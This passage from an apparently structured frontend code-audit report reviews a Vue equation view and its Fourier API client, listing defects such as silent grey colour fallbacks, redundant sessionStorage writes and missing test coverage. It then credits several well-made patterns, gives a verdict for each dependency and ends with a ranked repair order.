- `lib/colors.ts:77-87` `VIZ_COLORS` is seeded `amber: "#b37a2d"` — a **non-empty string** before `resolveVizColors` ever runs
- `lib/colors.ts:24,53` `cssVarToHex` returns `"#888888"` on both the empty-value and the no-match branches — also non-empty
- `lib/colors.ts:32-53` the parser has arms for `#hex`, `hsl(…)`, bare `h s% l%`, `rgb(…)` — and **no `oklch()` / `lab()` / `color()` arm**
- `web/src/style.css:120,125` fourier overrides `--viz-amber: hsl(35 76% 35%)` / `hsl(37 73% 67%)`

**Claim.** `VIZ_COLORS.amber` is *never* falsy, so `|| VIZ_COLORS.golden` is unreachable dead code and the comment's stated invariant is false. The genuine failure mode is not "falls back to golden" — it is "**silently renders `#888888` grey**", because `cssVarToHex`'s failure return is a truthy grey. Today the token happens to parse (the bare-`hsl` arm matches the space-separated syntax); the moment `--viz-amber` is authored in `oklch()` — which is what the glass-ui 7 uplift in F.W1 brings — the coefficient popover renders grey while `EquationView.vue:421` (`.eq-card :deep(.eq-coeff:hover) { color: var(--viz-amber) }`) renders correct amber from the *same token* via the *other* path. Two resolution paths for one token, silently disagreeing.

**Failure scenario.** Post-F.W1: hover an `a_n` in the sigma equation. The symbol turns amber (CSS path). The KaTeX popover it opens shows `a_1 = 0.4053` in grey (JS path). No error, no warning.

**Falsifier.** Show `VIZ_COLORS.amber` reachable as `""`/`undefined`. `reactive({ amber: "#b37a2d", … })` (`colors.ts:81`) plus `cssVarToHex`'s two truthy returns make that impossible without an external mutation, and `resolveVizColors` (`:94`) only ever assigns `cssVarToHex`'s output. Falsified for the oklch half if glass-ui 7's `--viz-amber` stays in `hsl()` — that is checkable against the producer and is the one open question; the dead-fallback and grey-failure halves stand regardless.

**Corpus contradiction (stated).** `CENSUS §…:187-188` books F.W2's colors.ts work as deleting "the hand-rolled arms (declared 3-line hex residual)". Reached from EquationView, this is not a 3-line hex residual — it is a live two-path token-resolution contract with a false invariant comment and a silent-wrong-color failure. The F.W2 scope needs widening.

### D-17 · MAJOR · `saveCachedResult` re-serialises the whole response on every debounced simplify

**Provenance**
- `EquationView.vue:141` `if (result.value) saveCachedResult(result.value, displayLatex.value, displayEnergy.value)` — inside `doSimplify`
- `useEquationCache.ts:48` `sessionStorage.setItem(RESULT_KEY, JSON.stringify({ result: r, latex, energy }))`
- payload: `original_points` (2 × `n_eval_points` = 1000 float64s) + `reconstructed_points` (another 1000, all dead — D-14) + up to ~201 coefficient objects × 5 floats

**Claim.** Every notation/budget change re-`JSON.stringify`s ≈40 KB and performs a **synchronous, main-thread, blocking** `sessionStorage` write — even though `result` has not changed. Only `latex` and `energy` changed; the cache API offers no partial update. The `try {} catch {}` at `:48` swallows `QuotaExceededError` silently, so a full store degrades to "the cache silently stops working" with no signal (compounding D-04's poisoning surface).

**Falsifier.** Show `result` changing inside `doSimplify` — it does not; `doSimplify` writes only `displayLatex`, `displayEnergy`, `lastDisplayKey`. Cost magnitude is `UNPROVEN-NEEDS-LIVE`; the redundant write is provable.

---

## §3 — MINOR

| # | sev | claim | provenance | falsifier |
|---|---|---|---|---|
| D-18 | MINOR | The lucide `info` glyph is hand-inlined as 3 raw SVG paths **while the same icon is imported and used 20 lines later**. `<circle cx=12 cy=12 r=10/><path d="M12 16v-4"/><path d="M12 8h.01"/>` is byte-for-byte lucide's `info`. | `EquationView.vue:277-279` (inline) vs `:11` `import { Info } from "lucide-vue-next"` vs `:300` `<Info class="size-3.5 …" />` | Show the inline SVG differing from lucide's `info` path data. It does not. |
| D-19 | MINOR | Two unlinked magic `500`s span the client↔operation seam: the client's `n_eval_points` and the plot's own sample count. Change one and the cursor/blend geometry desyncs from the transmitted grid with no compile-time signal. | `EquationView.vue:108` `n_eval_points: 500` · `ConvergencePlot.vue:108` `const nPts = 500` · `api/models/equations.py:21` `ge=50, le=5000` | Show a shared constant. There is none; the two literals are in different files with no import between them. R6-8's seam-attribution lesson. |
| D-20 | MINOR | Six `v-model:` bindings and one hand-rolled `:prop` + `@update:` pair on the **same element**, for a prop the child already declares as a matching prop/emit pair (i.e. it could be `defineModel`). | `EquationView.vue:199-209` (`v-model:expression`…`v-model:notation`, then `:auto-harmonics` + `@update:auto-harmonics`) vs `FunctionInput.vue:15,21` | Show `autoHarmonics` needing one-way flow. `FunctionInput.vue:33` `emit("update:autoHarmonics", !props.autoHarmonics)` is a plain toggle — `defineModel<boolean>("autoHarmonics")` is equivalent. |
| D-21 | MINOR | `effectiveN` / `energyCaptured` / `autoHarmonics` / `vizHarmonics` are all declared **optional** on the child, forcing defensive `?? nHarmonics` fallbacks in three places — yet EquationView always passes all four. Unearned optionality paid for at every use site. | `FunctionInput.vue:12-18` (all `?`) vs `EquationView.vue:205-208` (all passed) vs `FunctionInput.vue:183`, `:216`, `:217` (`vizHarmonics ?? nHarmonics` ×3) | Show a second `<FunctionInput>` mount omitting them. `grep -rn "<FunctionInput" web/src/` → one. |
| D-22 | MINOR | `:disabled="!effectiveN"` can essentially never fire — `effectiveN` is seeded `20` and only ever reassigned from a server response. | `EquationView.vue:41` `ref(cachedRes?.result?.effective_n ?? 20)` · `:119` · `FunctionInput.vue:193` | Show a path setting `effectiveN` to `0`. Only `compute_effective_n` could, and the disabled state would then be indistinguishable from "not yet computed". |
| D-23 | MINOR | `SegmentedTabs` emits `(value: string)`, forcing a `as 'controls' \| 'canvas'` cast at the seat. The library's model is a bare `string`, so the consumer's union is unenforceable at the boundary. | `EquationView.vue:191` · `dist/components/custom/tabs/SegmentedTabs.vue.d.ts` `__VLS_ModelProps = { modelValue: string }`, emit `"update:modelValue": (value: string) => any` | Show a generic parameter on `SegmentedTabs`. There is none at 4.0.0 — this is a **producer-side** contract weakness the consumer absorbs; carry to glass-ui. |
| D-24 | MINOR | `SegmentedTabs` ships a `responsive` prop that collapses the strip to a `<Select>` below a configurable breakpoint. EquationView hand-rolls the entire mobile/desktop split instead (D-13's three authorities). | `dist/…/SegmentedTabs.vue.d.ts` `SegmentedTabsResponsive { breakpoint, desktopOptions, ariaLabel, triggerClass }` vs `EquationView.vue:45,187,196,219,437-441` | Show `responsive` unable to express the panel swap. It cannot express the *panel* swap — but it would have owned the *breakpoint*, which is the part that is triplicated. |
| D-25 | MINOR | Within one file, two floating surfaces use two different shadow idioms: `.coeff-popover` tokenises (`color-mix(in srgb, var(--foreground) 8%, transparent)`) while `.info-hovercard` hardcodes `rgba(0,0,0,0.12)` — which does not adapt to dark mode. | `EquationView.vue:400` vs `:465` | Show `rgba(0,0,0,0.12)` intended as theme-invariant. The sibling 20 lines up proves the tokenised idiom is the house style. |
| D-26 | MINOR | Stale provenance citation: the code cites `api/routers/equations.py:61` for the `endpoint=False` convention; the statement is at line **59**. | `ConvergencePlot.vue:113` vs `api/routers/equations.py:59` | Read the file. Off by two. |
| D-27 | MINOR | `lucide-vue-next` is imported by **runtime source** but declared in `devDependencies`; separately, glass-ui 4.0.0 peers `@lucide/vue@^1.16.0`, which is **not installed** (only `@lucide/vue` as a transitive dir; `lucide-vue-next` is the one resolved). | `EquationView.vue:11` · `web/package.json` `devDependencies["lucide-vue-next"]` · glass-ui `peerDependencies["@lucide/vue"]` | Show the app shipping without bundling. It is a Vite bundle, so it "works" — the defect is classification + an unmet producer peer, both provable from the manifests. Extends `lane-frontend.md:70`'s dead-devDep row from the opposite direction. |
| D-28 | MINOR | `/equation` has **zero functional coverage**. The only spec touching it is a screenshot/axe visual baseline at 375 / 1280 / 1440 — no viewport in D-13's 1023–1024 band, and no interaction with any control audited above. | `web/e2e/visual-baseline.spec.ts:34`, `:40-44`; `grep -rln "equation" web/e2e/` → that file only | Show an interaction spec. `ls web/e2e/` → contour, gallery, paper-perf, settings, visual-baseline, viz-crud, viz-ux, workspace. None is equation. |

---

## §4 — SUPERLATIVES (L-18, both ways)

### S-01 · the E.W5 fetch-core collapse retired two casts **structurally**, and the reasoning is committed next to the code

`lib/equation/api.ts:1-12` records that the local `eqFetch` (a 4th fetch helper with its own AbortController registry) was deleted in favour of the shared `apiFetch`, and — the part that matters — that the two `as unknown as` casts retired *because the core's `body` axis was widened to `FormData | Record<string, unknown> | BodyInit | undefined`*, not because someone deleted the word `as`. `lib/api.ts:73-84` carries the same reasoning from the other side. **Verified:** `grep -rn "as unknown as" web/src/lib/equation/ web/src/components/equation/` → 1 hit, and it is the prose in that header. Zero real casts.

*Falsifier:* a surviving `as unknown as`, or a `body` type that still requires one. `lib/api.ts:89-92` types `body?: FormData | BodyInit | object` — the widening is real. **Not falsified.** *Caveat (D-15):* the same file left a third, self-inflicted cast at `:49` by declaring `notation: string`. The superlative stands for the two it retired properly; the third is booked as a defect.

### S-02 · `useCoeffHover` — a correct, minimal extraction with the right DOM strategy

`composables/useCoeffHover.ts` lifts 106 lines of KaTeX rendering + DOM hit-testing out of the SFC behind a clean two-in/five-out contract, consumed in exactly two lines (`EquationView.vue:75-76`). The DOM strategy is the right one: **one** delegated `mousemove` on the card (`:252`) with `closest(".eq-coeff")` (`useCoeffHover.ts:29`), rather than N listeners on N KaTeX spans that KaTeX re-creates on every re-render. Coordinates are computed relative to the card via two `getBoundingClientRect`s (`:36-41`), so the popover positions correctly inside a scrolled/transformed ancestor.

*Falsifier:* per-span listeners, or a positioning scheme that breaks under scroll. Neither present. **Not falsified.** *Caveat (D-16):* its colour resolution carries a false invariant comment.

### S-03 · the ordering hazard at `:116-118` is documented at the exact line where it bites

```
// Capture display key BEFORE effectiveN triggers the vizHarmonics→budget
// chain, so a subsequent doSimplify can detect the budget changed.
lastDisplayKey = displayKey();
effectiveN.value = result.value.effective_n;
```
A two-line comment naming a *reactive-graph ordering* dependency — that assigning `effectiveN` synchronously fires `vizHarmonics` → the `:151` watcher → `budget`, which would otherwise invalidate a key captured after. This is the rare case of load-bearing sequencing being annotated where it is load-bearing rather than in a distant doc.

*Falsifier:* show the ordering doesn't matter. Swap the two lines and `displayKey()` reads the mutated `budget`, so `doSimplify`'s `key === lastDisplayKey` check at `:133` would suppress a needed re-render. The comment is correct. **Not falsified.** *Caveat (D-06):* the author saw the hazard on the `budget` axis and stopped short of the `notation`-mid-flight axis, which the same capture also breaks.

### S-04 · the client names the server's sampling convention and cites its source line

`ConvergencePlot.vue:112-115` and `:123-127` explain, in the client, that the partial-sum x-grid uses `endpoint=false` *because that is the backend's equispaced Fourier convention* (the periodic wrap identifies `x = domB` with `x = domA`), while the original curve gets an appended closing sample for visual closure. **Verified live:** `api/routers/equations.py:59` `np.linspace(domain[0], domain[1], req.n_eval_points, endpoint=False)`. A client that documents *why* its geometry differs from the payload's, with a pointer into the server, is exactly the client↔operation join R6-8 says must exist somewhere.

*Falsifier:* the backend using `endpoint=True`, or the two grids being identical (making the comment noise). Neither. **Not falsified.** *Caveat (D-26):* the citation is two lines stale — the pointer is right, the line number drifted.

---

## §5 — Consumption verdict per producer

| producer | pinned / installed | this seat's surface | verdict |
|---|---|---|---|
| **value.js** | `^0.13.0` / `0.13.0` | 0 direct imports; **3 bare-root specifiers in the import closure** (D-10), all for `easeInOutSine`; the hand-rolled `colors.ts` arm reached via `useCoeffHover` (D-16) | **RED.** Peer range already violated by the installed pair (D-11, contradicting the corpus). The F.W1 root-export deletion breaks the plot subtree. F.W2's scope must widen past "3-line hex residual". |
| **keyframes.js** | `^4.3.0` / `4.3.0` | **zero** — 8 hand-authored CSS transitions (`:444-452`) on glass-ui motion tokens, plus one globally-cascaded `tooltip-in` keyframe (`:466`) | **AMBER.** Not a defect per se (CSS transitions are the right tool for 4 discrete states), but the seat is a pure non-consumer of a pinned dependency, and its one keyframe use rides an undeclared global cascade from glass-ui's `animations.css`. Token drift: `:466` uses `--ease-out-expo` for `tooltip-in` while `ConvergencePlot.vue:402` uses `--ease-standard` for the same keyframe. Both tokens resolve (`glass-ui/dist/styles/tokens/scheme-motion.css`). |
| **glass-ui** | `^4.0.0` / `4.0.0` | 4 imports (`Button`, `HoverCard`, `MetricBadge`, `SegmentedTabs`); **2 on the deletion list** (D-12); `HoverPopover` reimplemented by hand (D-08); `.cartoon-card` × 5 on a consumer resurrection shim (D-09); `responsive` unused (D-24) | **RED.** This is the deepest consumption debt in the component. Two removed primitives + one deleted recipe class + one ignored surviving component. |
| **fourier API** (2 of 45 ops) | `POST /api/equations/compute`, `POST /api/equations/simplify` | client edges exist for both; contract fidelity does not | **RED.** Range mismatch (D-01), no problem+json envelope (D-02), racing abort keys (D-06), a response field the sigma view needs and the operation does not return (D-05), dead payload (D-14), foreign-type wrapper (D-15), duplicated magic constant (D-19). |

---

## §6 — Ranked repair order (cheapest-first within severity)

1. **D-01** clamp `budget` to `Math.min(50, …)` at the slider's `:max` *and* in the `:151` watcher — 2 lines; or lift `le=50` to a shared constant across the seam (the R6-8-correct fix).
2. **D-05** add `latex_sigma` to `SimplifyResponse` (both models) and write it in `doSimplify` — the notation control becomes live.
3. **D-04** guard `result.value.coefficients` at `:61` (`?.coefficients ?? []`, matching the already-correct `:72`) and validate `loadCachedResult`'s shape.
4. **D-02** either give `/api/equations/*` the problem+json envelope the rest of the API has, or read `.detail`/`.status` and fall back to a non-empty literal at `:123`.
5. **D-03** replace `trust: true` with a protocol-filtering handler at all three KaTeX sites (KaTeX's own documented mitigation).
6. **D-06** share one abort key across both equation operations, or add a generation counter around `displayLatex`.
7. **D-10** three-line rewrite to `@mkbabb/value.js/easing` — the cheapest leg of F.W1/F.W2, entirely inside this closure.
8. **D-08 / D-12** `HoverCard` + the global `.info-hovercard` block → `<HoverPopover>`; `MetricBadge` → `Metric` at the 7.0.0 hop.
9. **D-14 / D-17** drop `reconstructed_points` from the response (or read it and delete the client's duplicate reconstruction); stop re-writing the cache on simplify.
10. **D-13** one breakpoint token shared by JS and CSS; `1023.98px` or `not all and (min-width: …)`.
11. **D-07 / D-18 / D-26** delete `loading`, delete the inline SVG, fix the citation.
12. **D-28** the whole list above is invisible to CI. One interaction spec covering compute → notation → budget → cache-restore would have caught D-01, D-05, D-07 and D-14 mechanically.
